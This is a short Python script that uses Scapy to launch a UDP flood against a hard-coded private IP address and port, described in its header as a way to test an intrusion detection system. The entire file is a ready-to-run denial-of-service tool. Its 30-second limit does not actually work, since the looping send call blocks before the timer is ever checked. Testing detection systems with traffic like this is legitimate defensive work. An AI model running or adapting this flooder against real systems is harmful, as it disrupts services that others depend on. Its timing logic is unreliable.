#!/usr/bin/env python3

"""
Simple UDP Flood Attack Script

Author: Vignesh Siva
Date: August 2025
Version: 1.0

This script is for testing the Intrusion Detection System. It uses the Scapy 
library to launch a simple UDP flood attack against a specified target IP address 
and port for a defined duration.
WARNING: Only use this on a network you own and for testing purposes.
"""

from scapy.all import send, IP, UDP, RandShort
import time

# --- Configuration ---
VICTIM_IP = "192.168.0.126" 
TARGET_PORT = 80
ATTACK_DURATION_SECONDS = 30 # Run the attack for 30 seconds

def udp_flood(target_ip, target_port, duration):
    """Sends a flood of UDP packets to a target."""
    print(f"Starting UDP flood against {target_ip}:{target_port} for {duration} seconds...")
    
    # Create a malicious UDP packet
    packet = IP(dst=target_ip) / UDP(sport=RandShort(), dport=target_port)
    
    end_time = time.time() + duration
    packet_count = 0
    
    try:
        # The send function in Scapy has a built-in loop option
        # 'loop=1' will send continuously, 'verbose=0' keeps the console clean
        print("Attack running. Press Ctrl+C to stop.")
        send(packet, loop=1, verbose=0)
        
        while time.time() < end_time:
            time.sleep(1)
        print("Attack Stopped.....")
    except KeyboardInterrupt:
        print("\nAttack stopped.")

if __name__ == "__main__":
    udp_flood(VICTIM_IP, TARGET_PORT, ATTACK_DURATION_SECONDS)